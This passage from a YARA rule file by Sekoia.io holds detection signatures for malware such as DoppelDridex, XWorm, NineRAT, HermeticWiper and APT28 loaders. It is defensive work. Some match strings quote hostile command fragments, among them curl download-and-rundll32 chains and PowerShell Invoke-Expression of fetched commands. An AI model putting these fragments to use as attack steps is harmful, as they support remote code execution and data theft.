		id = "aeda5d15-82e1-4ffc-8252-1eb4fc78d024"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_kimsuky_sharpext_compromised_securepreferences.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "662358fdb4c4cfa9984d06e391ade52e1c7a3d7b78724aea4fb0d6035fe2e7b2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "\"devtools\", \"tabs\", \"webNavigation\", \"webRequest\", \"webRequestBlocking\""
		$ = "AppData\\\\Roaming"
		$ = "https://*/*"

	condition:
		all of them
}

rule SEKOIA_Loader_Win_Doppeldridex
{
	meta:
		description = "Detect the DoppelDridex banking trojan using its Rich header"
		author = "Sekoia.io"
		id = "ee5111ae-ba0b-4cd3-abe6-c66324d16840"
		date = "2021-09-28"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/loader_win_doppeldridex.yar#L3-L33"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "4ceed302cb36b73d98070996ede64742579a261ef3ede6e1eb1723ddca32e839"
		score = 75
		quality = 80
		tags = ""
		version = "1.1"
		classification = "TLP:CLEAR"

	condition:
		pe.rich_signature.toolid( 122 , 50727 ) and pe.rich_signature.toolid ( 1 , 0 ) and pe.rich_signature.toolid ( 222 , 40629 ) and pe.rich_signature.toolid ( 131 , 30729 ) and pe.rich_signature.toolid ( 220 , 31101 ) and pe.rich_signature.toolid ( 202 , 60315 ) and pe.rich_signature.toolid ( 202 , 50727 ) and pe.rich_signature.toolid ( 261 , 23506 ) and pe.rich_signature.toolid ( 149 , 21022 ) and pe.rich_signature.toolid ( 261 , 23918 ) and pe.rich_signature.toolid ( 219 , 21005 ) and pe.rich_signature.toolid ( 171 , 30319 ) and pe.rich_signature.toolid ( 225 , 21005 ) and pe.rich_signature.toolid ( 221 , 21005 ) and pe.rich_signature.toolid ( 259 , 24210 ) and pe.rich_signature.toolid ( 258 , 24213 ) and pe.rich_signature.toolid ( 158 , 40219 ) and pe.rich_signature.toolid ( 145 , 21022 ) and pe.rich_signature.toolid ( 207 , 60315 ) and pe.rich_signature.toolid ( 256 , 23026 )
}

rule SEKOIA_Zip_Win_Abcloader
{
	meta:
		description = "Use the CRC32 to detect a zip containing the doc file used to drop and launch ABCloader"
		author = "Sekoia.io"
		id = "0d14b34a-9095-48fa-b616-4e8239f3b547"
		date = "2024-08-19"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/zip_win_abcloader.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "0c7d8e611781b29e15df415640858294"
		logic_hash = "024d068a86432f35b0f7af0c4cdccb37d0979d01e90f7c9d1ae8a2dddfa3bfc8"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$crc = {32 56 27 e2}
		$name = "iden.doc"

	condition:
		$name at @crc [ 1 ] + 16
}

rule SEKOIA_Keylogger_Win_Donot
{
	meta:
		description = "Detect the DoNot's keylogger malware"
		author = "Sekoia.io"
		id = "4f67dda7-da68-4496-a8b4-a8a769ddd763"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/keylogger_win_donot.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "eb935f84335e934346511b4108f70df469deef6ecaaba809c144197c04a28f64"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "iwrct2mTFAu0ew1nyqQgoaNtNo0+52R0XiTKbwy1W48Bn1b2YcNt0+tptyY6oGoAeLDGekM/yHcdikNGi8bLqkUQ8CIdkWeT3QiympOTfjs="
		$ = "ZmVwZW9kbWZ2c24ucHMuZ3h4LngweXBvdWpkYm1qcXE7YnFmVXp1LmZvb3VEcA=="

	condition:
		1 of them
}

rule SEKOIA_Typhon_Reborn_Stealer
{
	meta:
		description = "Typhon Reborn v2 string based detection"
		author = "Sekoia.io"
		id = "aab7279b-b651-4092-b988-d186d0a433de"
		date = "2023-05-15"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/typhon_reborn_stealer.yar#L3-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "0db77a2e1d6b7274b0256fe469b72953c1b8598cbfc1715a43e5fbfa7899fe4c"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "api.telegram.org/bot" wide
		$s2 = "TyphonReborn Stealer v2 log!" wide

	condition:
		all of them and pe.is_pe
}

rule SEKOIA_Apt_Win_Disabledefender
{
	meta:
		description = "detects strings and imphash"
		author = "Sekoia.io"
		id = "a7b124ab-4c9d-47c0-a59e-211cc713b9b3"
		date = "2022-09-23"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_win_disabledefender.yar#L3-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "3b8c8d9144d9f97ee053c7cefc30d3920940bc33efcd1d7f5c61666217ef7896"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "Restarting with privileges"
		$ = "Windows defender is currently ACTIVE"
		$ = "Windows defender is currently OFF"
		$ = "Disabled windows defender"
		$ = "Failed to disable defender..."

	condition:
		4 of them or pe.imphash ( ) == "74a6ef9e7b49c71341e439022f643c8e"
}

rule SEKOIA_Apt_Lazarus_Blindingcan_Rtti
{
	meta:
		description = "Detects BLINDINGCAN with RTTI"
		author = "Sekoia.io"
		id = "9a16c189-ffc1-4aa6-8582-298abaecd0ef"
		date = "2022-10-04"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_lazarus_blindingcan_rtti.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "fbec1f9a180782bf330d86facbada9af018741897c58f4ab6e0b52a1b38ae966"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = ".?AVCHTTP_Protocol@@" ascii wide fullword
		$s2 = ".?AVCFileRW@@" ascii wide fullword

	condition:
		all of them
}

rule SEKOIA_Tool_Pivotnacci
{
	meta:
		description = "Detects Pivotnacci"
		author = "Sekoia.io"
		id = "31ecb08a-fc92-4cbe-a865-7ce869a5fa6a"
		date = "2024-04-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/tool_pivotnacci.yar#L1-L21"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "b0e4bc997775fb5ff258a23e07a58b4897a2ce9d3fffab86e93919857e566d18"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$pivotnacci = "pivotnacci"
		$s1 = "Socks server => %s:%s"
		$s2 = "The default listening address"
		$s3 = "Socks server for HTTP agents"
		$s4 = "Message returned by the agent web page"
		$s5 = "Password to communicate with the agent"
		$s6 = "To specify agent type in case is not automatically detected."

	condition:
		$pivotnacci and 3 of ( $s* )
}

rule SEKOIA_Xworm_Dotnet_Injector
{
	meta:
		description = ".NET injector used by XWorm TA"
		author = "Sekoia.io"
		id = "50581a9d-afc3-43da-9e34-3a553cbd01b4"
		date = "2022-12-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/xworm_dotnet_injector.yar#L1-L21"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "4777edacf4719e602ae1fb7204ea97cd594277faa1c2b7ad430066ad82b40768"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$first_payload = "jBGIcSr2fKhj1ZT2YNLBTcYYeAw/vWUT98dCA/H6hpI+dY+lkoSe1ATx7XEIXKtAdTSwl1PKhNROoxstXsnsHTZbS2ikRLv6lmHd5v09DltsPeXIOA789wZC8qR1OScJFohGxuWQSQ8K2TAFUQAntIFdX+Om1QZUARdDnb4f+P8VFucU9avWD75yK1IcTDDDEYwvm/rwUYTqWitcrfIY+aFcgQwyvEzkN7Pbsah4Kts+XmK0C3TzlnDd2mz6TdsPphGbBxcbBdZGMTyzunZUEKRYea7xM6u+az9v7m6a1G6vhsSqz4C/nleDmzL2dIVnVR6Ni6+0hlExcP" wide
		$rijndael_key1 = { e5 a0 b1 e8 89 be e8 8e 8e e4 bb a3 e5 ba b5 e9 85 8d e7 89 b9 e6 b0 8f e5 85 8b e9 9b 99 e8 89 be e5 8b 92 e6 8b 89 e6 a1 83 e9 ad 9a e6 88 91 e6 96 af e6 a1 83 e5 ba 95 e5 be b7 }
		$rijndael_key2 = { e7 9b 9f e7 91 aa e6 a1 83 e9 87 91 e5 90 89 e9 97 95 e5 a0 b1 e9 9b 99 e9 97 95 e5 96 ac e5 ba 95 e5 a0 b1 e5 be b7 e6 8b 89 e5 92 8c e7 a0 b4 e7 88 be e9 a6 ac e6 88 91 e5 8a a0 }
		$rijndael_key3 = { e6 9b b2 e6 b0 8f e5 ba b5 e5 a3 ab e9 97 95 e5 be b7 e6 96 af e8 9b 8b }
		$s1 = "fullofdick"
		$s2 = "holdmeback"
		$s3 = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe" wide

	condition:
		($first_payload and all of ( $rijndael_key* ) ) or 2 of ( $s* )
}

rule SEKOIA_Dropper_Win_Ninerat
{
	meta:
		description = "NineRAT dropper"
		author = "Sekoia.io"
		id = "798e3bee-4cee-4647-abda-3c3dcc602f0a"
		date = "2023-12-12"
		modified = "2024-12-19"
		reference = "https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/dropper_win_ninerat.yar#L4-L41"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "00f69545c7351fba8b45e2b4d21855ba8ae94f2d10df199732665e8f3f00c1b4"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "534f5612954db99c86baa67ef51a3ad88bc21735bce7bb591afa8a4317c35433"
		hash2 = "f91188d23b14526676706a5c9ead05c1a91ea0b9d6ac902623bc565e1c200a59"

	strings:
		$ = "\\x64\\Release\\Dropper.pdb"
		$ = "TelegramRat\\lastest\\Dropper"

	condition:
		all of them or pe.imphash ( ) == "92b8e9dea06fd5719e29a510e95b92ac" or hash.md5 ( pe.rich_signature.clear_data ) == "ba1ea20fe779ef0b747e5073c0881a99" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "c0471e0a78eef692b567cd89eeaddf08" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "965dc8b7c98325ca3d3371ced8424823" ) or for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "bae1db350e313bf7bbd3b2178b20e6f6dd9b0331780099374edae5a99625bc5b" or hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "1abb447513b4435837029933e722b6ed92222291571a8ce0a306c9f6a335aa19" or hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "ffbcd5bbe6c02aa5c993886811d7597f020abd6665fc82af133c5756ab72fb0a" )
}

rule SEKOIA_Apt_Apt29_Quarterrig
{
	meta:
		description = "Detects QUARTERRIG"
		author = "Sekoia.io"
		id = "e370ed7e-5e12-4add-95f3-3773ea8e2d03"
		date = "2023-04-19"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_apt29_quarterrig.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "9628418789a9bc24c7e44dbc9106ffa6316aefebe33b91c749b54cb5462b1309"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$str_dll_name = "hijacker.dll"
		$str_import_name = "VCRUNTIME140.dll"
		$op_resolve_and_call_openthread = { 48 [6] 48 [6] 8B D8 E8 [4] [3] 33 D2 B9 FF FF 1F 00 FF D0 }
		$op_resolve_and_call_suspendthread = { E8 [4] 48 8B CB FF D0 83 F8 FF }

	condition:
		all of them
}

rule SEKOIA_Wiper_Hermeticwiper_Variants
{
	meta:
		description = "Matches HermeticWiper and possible variants"
		author = "Sekoia.io"
		id = "102ecf15-167e-49e4-932c-6334e3cdcc69"
		date = "2022-02-24"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/wiper_hermeticwiper_variants.yar#L3-L26"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "d0c358517b0a6334d430d3bd75d6c58243ce84e0f90afe48a5069a1e1954119c"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SeLoadDriverPrivilege" wide
		$ = "\\\\.\\PhysicalDrive" wide
		$ = "::$INDEX_ALLOCATION" wide
		$ = "CrashDumpEnabled" wide

	condition:
		2 of them and pe.characteristics and pe.number_of_signatures == 1 and pe.number_of_resources > 2 and for 2 i in ( 0 .. pe.number_of_resources - 1 ) : ( uint32be( pe.resources [ i ] . offset + 15 ) == 0x4D5A9000 and uint16be( pe.resources [ i ] . offset ) == 0x535A )
}

rule SEKOIA_Malware_Win_Lyceum_Maldoc_Macro_20220613
{
	meta:
		description = "Detect the macro contained in Lyceum maldoc to deploy its malware"
		author = "Sekoia.io"
		id = "3046bffd-261f-4d5b-9015-f2e5fc31c9c9"
		date = "2022-06-13"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/malware_win_lyceum_maldoc_macro_20220613.yar#L1-L15"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "a9f4957e8198b4cb2229913a405b3e0fc97cbd3598bb583dbfdaf56ca278d4cb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "ActiveDocument.InlineShapes(i).PictureFormat.Brightness = 0.5" ascii

	condition:
		all of them
}

rule SEKOIA_Downloader_Win_Curl_Agent
{
	meta:
		description = "Detect the downloader used by Bluenoroff to install it CurlAgent"
		author = "Sekoia.io"
		id = "ddeb2d8f-1b10-4a33-b768-d19412e8551a"
		date = "2023-05-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/downloader_win_curl_agent.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "b34375ec051c969adec82901c1130b0a389261912559d70c652ee826cb2d4107"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "%s\\marcoor.dll" wide
		$ = "curl -A cur1-agent -L %s -s -d dl"
		$ = "curl -A cur1-agent -L %s -s -d da"
		$ = "cmd /c timeout /t 10 & rundll32 \"%s\" #1" wide
		$ = "cmd /c timeout /t 10 & Del /f /q \"%s\" & attrib -s -h \"%s\" & rundll32 \"%s\" #1" wide

	condition:
		3 of them
}

rule SEKOIA_Apt_Susp_Apt28_Uac0063_Hta_Loader
{
	meta:
		description = "Detects some suspected APT28 HTA loader"
		author = "Sekoia.io"
		id = "8e1889c1-c6ac-4048-9d3a-99ccbbd5435f"
		date = "2024-07-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_susp_apt28_uac0063_hta_loader.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "332d9db35daa83c5ad226b9bf50e992713bc6a69c9ecd52a1223b81e992bc725"
		logic_hash = "494331a8088d350e4e49e67fe64041d451886e501775413f908bd9b3faa98aeb"
		score = 65
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HEAD><HTA:APPLICATION ID" ascii fullword
		$ = "id=service>null</span" ascii fullword
		$ = "script Language=\"VBScript.Encode" ascii fullword

	condition:
		2 of them
}

rule SEKOIA_Rat_Win_Lilith
{
	meta:
		description = "Detect the Lilith malware"
		author = "Sekoia.io"
		id = "944637e6-c4e4-423f-9f4c-a26b4fce3729"
		date = "2023-02-23"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/rat_win_lilith.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "ac2ad9e68616e6e7d07e105293545c96b72c956dbcf3c3bf317460cafc13be48"
		score = 75
		quality = 76
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = {55 6d 56 6e 55 58 56 6c 63 6e 6c 57 59 57 78 31 5a 55 56 34 51 51 3d 3d}
		$ = {67 65 74 61 64 64 72 69 6e 66 6f 3a 20 25 73}

	condition:
		all of them
}

rule SEKOIA_Ransomware_Win_Shrinklocker
{
	meta:
		description = "Detects files related to the ShrinkLocker ransomware"
		author = "Sekoia.io"
		id = "93a6fbdd-ad62-456a-a1a5-b5ae3b242004"
		date = "2024-06-07"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/ransomware_win_shrinklocker.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "7770b0946b9bb482f23c4ce0d753393e0d42a6fd8b31029847d74356296f0cf1"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$a = "shrinkdisk" ascii fullword
		$b = "BitLocker" ascii fullword
		$c = "diskpart" ascii fullword
		$d = "disk.vbs" ascii fullword
		$e = "strDriveLetter" ascii fullword
		$f = "shrinkcomplate" ascii fullword
		$g = "ADODB.Stream" ascii fullword
		$h = "Win32_OperatingSystem" ascii fullword
		$i = "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" ascii fullword
		$j = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii fullword
		$k = "HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE" ascii fullword

	condition:
		9 of them
}

rule SEKOIA_Apt_Apt28_Htmlsmuggling
{
	meta:
		description = "Detects some kind of HTMLSmuggling used by APT28"
		author = "Sekoia.io"
		id = "2e20c992-d971-4c0f-99b3-a7d528c7055a"
		date = "2023-09-11"
		modified = "2024-12-19"
		reference = "https://www.zscaler.com/blogs/security-research/steal-it-campaign"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_apt28_htmlsmuggling.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "47cca1d0a0843c8df43661ee8188dae86cce06e1f3982973871863728d328e89"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "click();" ascii
		$s2 = "window.location.replace("

	condition:
		$s1 in ( @s2 .. @s2-100 )
}

rule SEKOIA_Loader_Win_Jennlog
{
	meta:
		description = "Jennlog loader used to deliver the Apostle ransomware"
		author = "Sekoia.io"
		id = "a69088e5-207f-494f-876b-766b8050e8c2"
		date = "2021-10-04"
		modified = "2024-12-19"
		reference = "https://www.sentinelone.com/labs/new-version-of-apostle-ransomware-reemerges-in-targeted-attack-on-higher-education/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/loader_win_jennlog.yar#L4-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "0ffcd1f35570b28a1bd6f9a0361f8f921942f7345dcb2896fc092bb92f7d4d6d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		pe.timestamp== 3140259112 or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "4c4577276ff0323d9aedcc39ecf2c964" ) or for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "8476a7fca587f1e5d3ae076293b9fbcccbebc4bd4f7b783228ad5da39305a3d9" )
}

rule SEKOIA_Backdoor_Win_Sidewinder_Cobaltstrike_2022_09
{
	meta:
		description = "Detect the SideWinder malware"
		author = "Sekoia.io"
		id = "b5e8f87a-4a2c-49bb-aa98-bf3fb5056b23"
		date = "2022-10-24"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backdoor_win_sidewinder_cobaltstrike_2022_09.yar#L4-L29"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "f2b719170783c1bfaa4c4772e5cff73797be3056204566844c236d1857869e4c"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = {65004e004500560045005200200047004f004e004e00410020004700490056004500200059004f0055002000550050002100}

	condition:
		$s1 or pe.imphash ( ) == "b1e345b2d78e4b82617d995d18100790" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "ac989507d4af352fa354560efef99ba6" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "8090b29a44c750b7b21287f9639fe747" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "ea8693d6bacf3e7876f717a3d8abc433" )
}

rule SEKOIA_Apt_Cloudatlas_Stagescalldllmainafterexec
{
	meta:
		description = "Detects call to dllmain after execution of exported function"
		author = "Sekoia.io"
		id = "a24b7887-87f6-44e3-80c5-cd117e694595"
		date = "2023-10-31"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_cloudatlas_stagescalldllmainafterexec.yar#L1-L46"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "6d1c1717b4012e72b0069068158265dfd215cd7685a5489aba3de4a9024bfa28"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$chunk_1 = {
        55
        8B EC
        83 EC 10
        C7 45 ?? 00 00 00 00
        83 7D ?? 00
        74 ??
        8B 45 ??
        89 45 ??
        8B 4D ??
        8B 51 ??
        03 55 ??
        89 55 ??
        8B 45 ??
        8B 48 ??
        03 4D ??
        89 4D ??
        6A 00
        6A 00
        FF 75 ??
        FF 55 ??
        68 00 80 00 00
        6A 00
        8B 55 ??
        52
        FF 15 ?? ?? ?? ??
        C7 45 ?? 01 00 00 00
        8B 45 ??
        8B E5
        5D
        C2 04 00
        }

	condition:
		any of them
}

rule SEKOIA_Apt_Polonium_Powershell_Creepydrive_Strings
{
	meta:
		description = "Detects POLONIUM CreepyDrive Powershell implant"
		author = "Sekoia.io"
		id = "0ba196bd-9cd6-4553-b7bf-69989cdb8be4"
		date = "2022-06-03"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_polonium_powershell_creepydrive_strings.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "28b8f10a36d13e97e606b082f20c50c3d48241409e7f1aca621e2af9d756dbe5"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "function Exec($comm)" base64 ascii wide
		$ = "$comm = $comm + \"| outstring" base64 ascii wide
		$ = "Invoke-Expression -Command:$comm" base64 ascii wide
		$ = "microsoft.com" base64 ascii wide
		$ = "$req = Invoke-WebRequest" base64 ascii wide
		$ = "$j += $data" base64 ascii wide
		$ = "$res = Exec($arr[$i])" base64 ascii wide
		$ = "$arr = @(iex \"$req\")" base64 ascii wide
		$ = "elseif ($req -cmatch" base64 ascii wide
		$ = "graph.microsoft.com" base64 ascii wide

	condition:
		3 of them
}

rule SEKOIA_Apt_Spikedwine_Malicious_Hta
{
	meta:
		description = "Detects malicious HTA used by SPIKEDWINE"
		author = "Sekoia.io"
		id = "e4526142-d98a-bf35-9d2c-ca2e83638c4b"
		date = "2024-02-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_spikedwine_malicious_hta.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "305896cde5d95c29de511541a961063730709d40d67a8788f084c17f181e3baf"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID=" nocase
		$ = "return _0x"
		$ = "font-size: 18px;"

	condition:
		all of them
}

rule SEKOIA_Apt_Susp_Apt28_Uac0063_Hatvibe
{
	meta:
		description = "Detects some suspected UAC-0063/APT28 HTA loader"
		author = "Sekoia.io"
		id = "c4e04671-e75f-40a4-a489-79c2ce91cf7a"
		date = "2024-07-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_susp_apt28_uac0063_hatvibe.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "332d9db35daa83c5ad226b9bf50e992713bc6a69c9ecd52a1223b81e992bc725"
		logic_hash = "41e1f97e45bc42ad3057cc173d036806687223782e54997e7803c888ee394b09"
		score = 65
		quality = 28
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "& temp(Mid(" ascii fullword
		$ = ".InnerHTML =" ascii fullword
		$ = "peceert" ascii fullword
		$ = "window.setTimeout" ascii fullword
		$ = "cmdline = Split(" ascii fullword

	condition:
		3 of them
}

rule SEKOIA_Implant_Win_Apt29_2022_10
{
	meta:
		description = "APT29 implants from October 2022"
		author = "Sekoia.io"
		id = "0f270e75-f687-4fdc-a980-fde81107a4d6"
